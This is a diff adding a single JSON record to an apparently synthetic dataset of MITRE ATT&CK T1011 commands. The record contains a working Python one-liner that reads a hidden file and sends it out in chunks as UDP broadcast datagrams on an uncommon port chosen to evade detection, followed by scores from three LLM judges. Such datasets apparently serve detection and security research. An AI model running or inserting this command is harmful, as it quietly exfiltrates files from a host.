@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); addr=(\"255.255.255.255\", 49876); d=open(\"/Users/Shared/.sync.log\",\"rb\").read(); [s.sendto(d[i:i+1024], addr) for i in range(0,len(d),1024)]; s.close()'",
+  "explanation": "Exfiltrates data via IPv4 broadcast UDP on a non-standard high port, using local broadcast as an alternative network medium separate from a primary unicast channel, consistent with T1011.",
+  "rationale_steps": [
+    "Create an IPv4 UDP socket and enable broadcast.",
+    "Target the broadcast address with an uncommon port (49876) to reduce detection.",
+    "Chunk and transmit data as UDP datagrams (broadcast medium distinct from typical unicast C2).",
+    "No obfuscation; user-level safe."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-d7687590",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed python3 -c one-liner with balanced quotes, valid Python syntax, proper socket usage, and correct statement separators.",
+        "semantic_score": 3,
+        "semantic_justification": "It exfiltrates the file via UDP broadcast in chunks as described, but this remains standard IP over the same network interface rather than a different medium (e.g., cellular/Bluetooth) per T1011, and broadcast is typically limited to the local subnet and may be filtered.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:45:28.726894Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, proper semicolon separators, and valid Python syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by reading potentially sensitive data from a hidden log file and exfiltrating it over UDP broadcast (an alternative network medium) using a non-standard high port (49876), breaking the data into chunks and transmitting it in a way that bypasses standard network monitoring.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:45:33.231440Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code executed via `python3 -c` is perfectly well-formed, with balanced quotes, parentheses, and valid Python statements separated by semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly implements the described exfiltration method, using Python's socket module to perform IPv4 UDP broadcast of a file's contents, consistent with T1011's use of an alternative local network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:17:08.123190Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
